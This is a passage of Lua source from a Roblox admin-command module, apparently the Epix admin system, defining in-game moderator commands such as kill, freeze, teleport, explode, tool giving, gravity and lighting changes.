local pos=v.Character.Torso.CFrame
local temptools={}
pcall(function() v.Character.Humanoid:UnequipTools() end)
wait()
for k,t in pairs(v.Backpack:children()) do
	if t:IsA('Tool') or t:IsA('Hopperbin') then
		table.insert(temptools,t)
	end
end
v:LoadCharacter()
v.Character.Torso.CFrame=pos
for d,f in pairs(v.Character:children()) do
	if f:IsA('ForceField') then f:Destroy() end
end
wait(1)
v.Backpack:ClearAllChildren()
for l,m in pairs(temptools) do
	m:clone().Parent=v.Backpack
end
end)()
end
end)

set.MakeCommand('Kills the target player(s)',2,set.Prefix,{'kill'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1])
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v.Character:BreakJoints() end
end)()
end
end)

set.MakeCommand('Repsawns the target player(s)',2,set.Prefix,{'respawn'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then v:LoadCharacter()
	set.Remote(v,'Function','SetView','reset')
end
end)()
end
end)

set.MakeCommand('Rotates the target player(s) by 180 degrees or the angle you set',2,set.Prefix,{'trip'},{'player','angle'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local angle=180 or args[2]
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
v.Character.Torso.CFrame = v.Character.Torso.CFrame * CFrame.Angles(0,0,math.rad(angle)) 
end
end)()
end
end)

set.MakeCommand('Stuns the target player(s)',2,set.Prefix,{'stun'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.PlatformStand = true
end
end)()
end
end)

set.MakeCommand('UnStuns the target player(s)',2,set.Prefix,{'unstun'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.PlatformStand = false
end
end)()
end
end)

set.MakeCommand('Forces the target player(s) to jump',2,set.Prefix,{'jump'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.Jump = true
end
end)()
end
end)

set.MakeCommand('Forces the target player(s) to sit',2,set.Prefix,{'sit','seat'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.Sit = true
end
end)()
end
end)

set.MakeCommand('Makes the target player(s) invisible',2,set.Prefix,{'invisible'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Transparency = 1 if obj:findFirstChild("face") then obj.face.Transparency = 1 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 1 end
end
end
end)()
end
end)

set.MakeCommand('Makes the target player(s) visible',2,set.Prefix,{'visible'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") and obj.Name~='HumanoidRootPart' then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end
end
end
end)()
end
end)

set.MakeCommand('Locks the target player(s)',2,set.Prefix,{'lock'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr,args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Locked = true elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Locked = true end
end
end
end)()
end
end)

set.MakeCommand('UnLocks the the target player(s), makes it so you can use btools on them',2,set.Prefix,{'unlock'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Locked = false elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Locked = false end
end
end
end)()
end
end)

set.MakeCommand('Explodes the target player(s)',2,set.Prefix,{'explode','boom','boomboom'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
local ex = Instance.new("Explosion", game.Workspace) 
ex.Position = v.Character.Torso.Position
ex.BlastRadius=20
end
end)()
end
end)

set.MakeCommand('Makes a PointLight on the target player(s) with the color specified',2,set.Prefix,{'light'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright blue').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local p=Instance.new('PointLight',v.Character.Torso)
table.insert(set.objects,p)
p.Color=str
p.Brightness=5
p.Range=15
end
end)()
end
end)

set.MakeCommand('UnLights the target plyer(s)',2,set.Prefix,{'unlight'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do 
	if cl:IsA('PointLight') then cl:Destroy() end 
end
end
end)()
end
end)

set.MakeCommand('Makes a dialog bubble appear over the target player(s) head with the desired message',-1,set.Prefix,{'talk','maketalk'},{'player','message'},2,function(plr,args)
local message = args[2]
for i,p in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
game:service('Chat'):Chat(p.Character.Head,message,Enum.ChatColor.Blue)
end)()
end
end)

set.MakeCommand('Sets the target player(s) on fire, coloring the fire based on what you set',-1,set.Prefix,{'fire','makefire','givefire'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright orange').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local f=Instance.new('Fire',v.Character.Torso)
local p=Instance.new('PointLight',v.Character.Torso)
table.insert(set.objects,f)
table.insert(set.objects,p)
p.Color=str
p.Brightness=5
p.Range=15
f.Color=str
f.SecondaryColor=str
end
end)()
end
end)

set.MakeCommand('Puts out the flames on the target player(s)',-1,set.Prefix,{'unfire','removefire','extinguish'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Fire") or cl:IsA('PointLight') then cl:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Makes smoke come from the target player(s) with the desired color',-1,set.Prefix,{'smoke','givesmoke'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright orange').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local cl = Instance.new("Smoke", v.Character.Torso) table.insert(set.objects, cl)
cl.Color=str
end
end)()
end
end)

set.MakeCommand('Removes smoke from the target player(s)',-1,set.Prefix,{'unsmoke'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Smoke") then cl:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Puts sparkles on the target player(s) with the desired color',-1,set.Prefix,{'sparkles'},{'player','color'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local str = BrickColor.new('Bright blue').Color
if args[2] then
local teststr = args[2]
if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
end
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
local cl = Instance.new("Sparkles", v.Character.Torso) table.insert(set.objects, cl)
local p=Instance.new('PointLight',v.Character.Torso) table.insert(set.objects, p)
p.Color=str
p.Brightness=5
p.Range=15
cl.SparkleColor=str
end
end)()
end
end)

set.MakeCommand('Removes sparkles from the target player(s)',-1,set.Prefix,{'unsparkles'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for z, cl in pairs(v.Character.Torso:children()) do if cl:IsA("Sparkles") or cl:IsA('PointLight') then cl:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Gives a force field to the target player(s)',2,set.Prefix,{'ff','forcefield'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then Instance.new("ForceField", v.Character) end
end)()
end
end)

set.MakeCommand('Removes force fields on the target player(s)',2,set.Prefix,{'unff','unforcefield'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function() 
if v and v.Character then 
for z, cl in pairs(v.Character:children()) do if cl:IsA("ForceField") then cl:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Removes the target player(s)\'s character',2,set.Prefix,{'punish'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
v.Character.Parent = set.Storage
end
end)()
end
end)

set.MakeCommand('Gives the target player(s) hat pets, controled using the !pets command.',-1,set.Prefix,{'hatpets'},{'player','number[50 MAX]/destroy'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		if args[2] and args[2]:lower()=='destroy' then
			local hats=v.Character:FindFirstChild('EpixHatPets')
			if hats then hats:Destroy() end
		else
			local num=tonumber(args[2]) or 5
			if num>50 then num=50 end
			if v.Character:FindFirstChild('Torso') then
				local m=v.Character:FindFirstChild('EpixHatPets')
				local mode
				local obj
				local hat
				if not m then
					m=Instance.new('Model',v.Character)
					m.Name='EpixHatPets'
					table.insert(set.objects,m)
					mode=Instance.new('StringValue',m)
					mode.Name='Mode'
					mode.Value='Follow'
					obj=Instance.new('ObjectValue',m)
					obj.Name='Target'
					obj.Value=v.Character.Torso
				else
					mode=m.Mode
					obj=m.Target
				end
				for l,h in pairs(v.Character:children()) do if h:IsA('Hat') then hat=h break end end
				if hat then
					for k=1,num do
						local cl=hat.Handle:clone()
						cl.Name=k
						cl.CanCollide=false
						cl.Anchored=false
						cl.Parent=m
						local bpos=Instance.new("BodyPosition",cl)
						bpos.Name='bpos'
						bpos.position=obj.Value.Position
						bpos.maxForce = bpos.maxForce * 10
					end
				end
				set.Remote(v,'Function','MoveHats')
			end
		end
	end
end)

set.MakeCommand('[NEED HAT PETS TO USE] Makes your hat pets do the specified command (follow/float/swarm/attack)',2,set.AnyPrefix,{'pets'},{'follow/float/swarm/attack','player'},2,function(plr,args)
	local hats=plr.Character:FindFirstChild('EpixHatPets')
	if hats then
		for i,v in pairs(set.GetPlayers(plr,args[2])) do
			if v.Character:FindFirstChild('Torso') and v.Character.Torso:IsA('Part') then
				if args[1]:lower()=='follow' then
					hats.Mode.Value='Follow'
					hats.Target.Value=v.Character.Torso
				elseif args[1]:lower()=='float' then
					hats.Mode.Value='Float'
					hats.Target.Value=v.Character.Torso
				elseif args[1]:lower()=='swarm' then
					hats.Mode.Value='Swarm'
					hats.Target.Value=v.Character.Torso
				elseif args[1]:lower()=='attack' then
					hats.Mode.Value='Attack'
					hats.Target.Value=v.Character.Torso
				end
			end
		end
	else
		set.Remote(plr,'Function','OutputGui',"You don't have any hat pets! If you are an admin use the :hatpets command to get some")
	end
end)

set.MakeCommand('UnPunishes the target player(s)',2,set.Prefix,{'unpunish'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
v.Character.Parent = game:service("Workspace") v.Character:MakeJoints()
end
end)

set.MakeCommand('Freezes the target player(s)',2,set.Prefix,{'freeze'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Anchored = true end v.Character.Humanoid.WalkSpeed = 0
end
end
end)()
end
end)

set.MakeCommand('UnFreezes the target players, thaws them out',2,set.Prefix,{'thaw','unfreeze'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
for a, obj in pairs(v.Character:children()) do 
if obj:IsA("BasePart") then obj.Anchored = false end v.Character.Humanoid.WalkSpeed = 16
end
end
end)()
end
end)

set.MakeCommand('Heals the target player(s) (Regens their health)',2,set.Prefix,{'heal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end)()
end
end)

set.MakeCommand('Makes the target player(s) immortal, makes their health so high that normal non-explosive weapons can\'t kill them',2,set.Prefix,{'god','immortal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.MaxHealth = math.huge
v.Character.Humanoid.Health = 9e9
end
end)()
end
end)

set.MakeCommand('Makes the target player(s) mortal again',2,set.Prefix,{'ungod','mortal'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.MaxHealth = 100
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end)()
end
end)

set.MakeCommand('Change Ambient',2,set.Prefix,{'ambient'},{'num','num','num'},3,function(plr,args)
game:service('Lighting').Ambient = Color3.new(args[1],args[2],args[3])
end)

set.MakeCommand('Change OutdoorAmbient',2,set.Prefix,{'oambient','outdoorambient'},{'num','num','num'},3,function(plr,args)
game:service('Lighting').OutdoorAmbient = Color3.new(args[1],args[2],args[3])
end)

set.MakeCommand('Fog Off',2,set.Prefix,{'nofog','fogoff'},{},0,function(plr,args)
game:service('Lighting').FogEnd=1000000000000
end)

set.MakeCommand('Determines if shadows are on or off',2,set.Prefix,{'shadows'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
	game:service('Lighting').GlobalShadows=true
elseif args[1]:lower()=='off' then
	game:service('Lighting').GlobalShadows=false
end
end)

set.MakeCommand('Determines if outlines are on or off',2,set.Prefix,{'outlines'},{'on/off'},1,function(plr,args)
if args[1]:lower()=='on' then
	game:service('Lighting').Outlines=true
elseif args[1]:lower()=='off' then
	game:service('Lighting').Outlines=false
end
end)

set.MakeCommand('Repeats <command> for <amount> of times every <interval> seconds',2,set.Prefix,{'repeat','loop'},{'amount','interval','command'},3,function(plr,args)
local amount = tonumber(args[1])
local timer = tonumber(args[2])
if timer<=0 then timer=1 end
local command = args[3]:lower()
local num=0
coroutine.wrap(function()
repeat
set.ProcessCommand(plr,command,true)
wait(timer)
num=num+1
until num==amount
end)()
end)

set.MakeCommand('Change Brightness',2,set.Prefix,{'brightness'},{'number'},1,function(plr,args)
game:service('Lighting').Brightness =args[1]
end)

set.MakeCommand('Change Time',2,set.Prefix,{'time','timeofday'},{'time'},1,function(plr,args)
game:service('Lighting').TimeOfDay = args[1]
end)

set.MakeCommand('Fog Color',2,set.Prefix,{'fogcolor'},{'num','num','num'},3,function(plr,args)
game:service('Lighting').FogColor = Color3.new(args[1],args[2],args[3])
end)

set.MakeCommand('Fog Start/End',2,set.Prefix,{'fog'},{'start','end'},2,function(plr,args)
game:service('Lighting').FogEnd = args[2]
game:service('Lighting').FogStart = args[1]
end)

set.MakeCommand('Gives the target player(s) basic building tools and the F3X tool',2,set.Prefix,{'btools','buildtools','buildingtools','buildertools'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("Backpack") then 
local t1 = Instance.new("HopperBin", v.Backpack) t1.Name = "Move" t1.BinType = "GameTool"
local t2 = Instance.new("HopperBin", v.Backpack) t2.Name = "Clone" t2.BinType = "Clone"
local t3 = Instance.new("HopperBin", v.Backpack) t3.Name = "Delete" t3.BinType = "Hammer"
deps['F3X Building Tools']:Clone().Parent=v.Backpack
local t4 = Instance.new("HopperBin", v.Backpack) t4.Name = "Resize"
local cl=deps.ResizeScript:clone()
cl.Parent=t4
cl.Disabled=false
end
end)()
end
end)

set.MakeCommand('Places the desired tool into the target player(s)\'s StarterPack',2,set.Prefix,{'startergive'},{'player','toolname'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("StarterGear") and game:findFirstChild("Lighting") then 
for a, tool in pairs(set.Storage:children()) do
if tool:IsA("Tool") or tool:IsA("HopperBin") then
if args[2]:lower() == "all" or tool.Name:lower():find(args[2]:lower()) == 1 then tool:Clone().Parent = v.StarterGear end
end
end
end
end)()
end
end)

set.MakeCommand('Gives the target player(s) the desired tool(s)',2,set.Prefix,{'give','tool'},{'player','tool'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
for a, tool in pairs(set.Storage:children()) do
if tool:IsA("Tool") or tool:IsA("HopperBin") then
if args[2]:lower() == "all" or tool.Name:lower():sub(1,#args[2])==args[2]:lower() then 
	tool:clone().Parent = v.Backpack 
end
end
end
end)()
end
end)

set.MakeCommand('Steals player1\'s tools and gives them to player2',2,set.Prefix,{'steal','stealtools'},{'player1','player2'},2,function(plr,args)
local p1 = set.GetPlayers(plr, args[1]:lower())
local p2 = set.GetPlayers(plr, args[2]:lower())
coroutine.wrap(function()
for i,v in pairs(p1) do
	coroutine.wrap(function()
	for k,m in pairs(p2) do
		for j,n in pairs(v.Backpack:children()) do
			print(n.Name)
			local b=n:clone()
			n.Parent=m.Backpack
		end
	end
	v.Backpack:ClearAllChildren()
	end)()
end
end)()
end)

set.MakeCommand('Remove the target player(s)\'s screen guis',2,set.Prefix,{'removeguis','noguis'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		set.Remote(v,'Function','RemoveGuis')
	end
end)

set.MakeCommand('Remove the target player(s)\'s tools',2,set.Prefix,{'removetools','notools'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v:findFirstChild("Backpack") then 
for a, tool in pairs(v.Character:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
for a, tool in pairs(v.Backpack:children()) do if tool:IsA("Tool") or tool:IsA("HopperBin") then tool:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Shows you what rank the target player(s) are in the group specified by groupID',2,set.Prefix,{'rank','getrank'},{'player','groupID'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:IsInGroup(args[2]) then 
set.Hint("[" .. v:GetRankInGroup(args[2]) .. "] " .. v:GetRoleInGroup(args[2]), {plr})
elseif v and not v:IsInGroup(args[2])then
set.Hint(v.Name .. " is not in the group " .. args[2], {plr})
end
end)()
end
end)

set.MakeCommand('Removes <number> HP from the target player(s)',2,set.Prefix,{'damage','hurt'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid:TakeDamage(args[2])
end
end)()
end
end)

set.MakeCommand('Makes the target player(s)\'s gravity normal',2,set.Prefix,{'grav','bringtoearth'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
end
end)()
end
end)

set.MakeCommand('Set the target player(s)\'s gravity',2,set.Prefix,{'setgrav','gravity','setgravity'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(0,0,0)
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") then frc.force = frc.force - Vector3.new(0,prt:GetMass()*tonumber(args[2]),0) elseif prt:IsA("Hat") then frc.force = frc.force - Vector3.new(0,prt.Handle:GetMass()*tonumber(args[2]),0) end end
end
end)()
end
end)

set.MakeCommand('NoGrav the target player(s)',2,set.Prefix,{'nograv','nogravity','superjump'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Torso") then 
for a, frc in pairs(v.Character.Torso:children()) do if frc.Name == "BFRC" then frc:Destroy() end end
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(0,0,0)
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") then frc.force = frc.force + Vector3.new(0,prt:GetMass()*196.25,0) elseif prt:IsA("Hat") then frc.force = frc.force + Vector3.new(0,prt.Handle:GetMass()*196.25,0) end end
end
end)()
end
end)

set.MakeCommand('Set the target player(s)\'s health to <number>',2,set.Prefix,{'health','sethealth'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.MaxHealth = args[2]
v.Character.Humanoid.Health = v.Character.Humanoid.MaxHealth
end
end)()
end
end)

set.MakeCommand('Set the target player(s)\'s WalkSpeed to <number>',2,set.Prefix,{'speed','setspeed','walkspeed'},{'player','number'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") then 
v.Character.Humanoid.WalkSpeed = args[2]
end
end)()
end
end)

set.MakeCommand('Set the target player(s)\'s team to <team>',2,set.Prefix,{'team','setteam','changeteam'},{'player','team'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and game:findFirstChild("Teams") then 
for a, tm in pairs(game.Teams:children()) do
if tm.Name:lower():find(args[2]:lower()) == 1 then v.TeamColor = tm.TeamColor end
end
end
end)()
end
end)

set.MakeCommand('Set the target player(s)\'s field of view to <number> (min 1, max 120)',-1,set.Prefix,{'fov','fieldofview'},{'player','number'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		set.Remote(v,'Function','FieldOfView',args[2])
	end
end)

set.MakeCommand('Teleport the target player(s) to the place belonging to <placeID>',2,set.Prefix,{'place'},{'player','placeID'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
set.PromptPlaceTeleport(v,"Teleport to "..args[2].."?",args[2])
end)()
end
end)

set.MakeCommand('Teleport player1(s) to player2, a waypoint, or specific coords, use :tp player1 waypoint-WAYPOINTNAME to use waypoints, x,y,z for coords',2,set.Prefix,{'tp','teleport'},{'player1','player2'},2,function(plr,args)
if args[2]:match('^waypoint%-(.*)') then
	local m=args[2]:match('^waypoint%-(.*)')
	local point
	for i,v in pairs(set.Waypoints) do
		if i:lower():sub(1,#m)==m:lower() then
			point=v
		end
	end
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		if point then
			v.Character:MoveTo(point)
		end
	end
	if not point then set.Hint('Waypoint '..m..' was not found.',{plr}) end
elseif args[2]:find(',') then
	local x,y,z=args[2]:match('(.*),(.*),(.*)')
	for i,v in pairs(set.GetPlayers(plr,args[1])) do 
		v.Character:MoveTo(Vector3.new(tonumber(x),tonumber(y),tonumber(z))) 
	end
else
	local plrz = set.GetPlayers(plr, args[1]:lower())
	local plrz2 = set.GetPlayers(plr, args[2]:lower())
	for i, v in pairs(plrz) do
	coroutine.wrap(function()
	for i2, v2 in pairs(plrz2) do
	if v and v2 and v.Character and v2.Character and v.Character:FindFirstChild('Humanoid') and v.Character:findFirstChild("Torso") and v2.Character:findFirstChild("Torso") then
	if v.Character.Humanoid.Sit==true then
	v.Character.Humanoid.Sit=false
	wait(0.5)
	end
	v.Character.Torso.CFrame = v2.Character.Torso.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1))
	end
	end
	end)()
	end
end
end)

set.MakeCommand('Teleport the target player(s) up by <height> studs',-1,set.Prefix,{'freefall','skydive'},{'player','height'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character:FindFirstChild('Torso') then 
v.Character.Torso.CFrame=v.Character.Torso.CFrame+Vector3.new(0,tonumber(args[2]),0)
end
end)()
end
end)

set.MakeCommand('Change the target player(s)\'s leader stat <stat> value to <value>',2,set.Prefix,{'change','leaderstat','stat'},{'player','stat','value'},3,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("leaderstats") then 
for a, st in pairs(v.leaderstats:children()) do
if st.Name:lower():find(args[2]:lower()) == 1 then st.Value = args[3] end
end
end
end)()
end
end)

set.MakeCommand('Give the target player(s) the shirt that belongs to <id>',2,set.Prefix,{'shirt','giveshirt'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for g,k in pairs(v.Character:children()) do
if k:IsA("Shirt") then k:Destroy() end
end
local s=Instance.new('Shirt',v.Character)
s.ShirtTemplate="http://www.roblox.com/asset/?id="..args[2]
end
end)()
end
end)

set.MakeCommand('Give the target player(s) the pants that belongs to <id>',2,set.Prefix,{'pants','givepants'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
for g,k in pairs(v.Character:children()) do
if k:IsA("Pants") then k:Destroy() end
end
local s=Instance.new('Pants',v.Character)
s.PantsTemplate="http://www.roblox.com/asset/?id="..args[2]
end
end)()
end
end)

set.MakeCommand('Give the target player(s) the face that belongs to <id>',2,set.Prefix,{'face','giveface'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if not v.Character:FindFirstChild("Head") then return end
if v and v.Character and v.Character:findFirstChild("Head") and v.Character.Head:findFirstChild("face") then 
v.Character.Head:findFirstChild("face"):Destroy()--.Texture = "http://www.roblox.com/asset/?id=" .. args[2]
end
game:service('InsertService'):LoadAsset(tonumber(args[2])):children()[1].Parent=v.Character:FindFirstChild("Head")
end)()
end
end)

set.MakeCommand('Swag the target player(s) up',-1,set.Prefix,{'swagify','swagger'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
for i,v in pairs(v.Character:children()) do
if v.Name == "Shirt" then local cl = v:Clone() cl.Parent = v.Parent cl.ShirtTemplate = "http://www.roblox.com/asset/?id=109163376" v:Destroy() end
if v.Name == "Pants" then local cl = v:Clone() cl.Parent = v.Parent cl.PantsTemplate = "http://www.roblox.com/asset/?id=109163376" v:Destroy() end
end
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
set.Cape(v,'Fabric','Pink',109301474)
end
end)()
end
end)

set.MakeCommand('Send the target player(s) to the moon!',-1,set.Prefix,{'rocket','firework'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
if v.Character and v.Character:FindFirstChild("Torso") then
delay(0,function()
local speed = 10
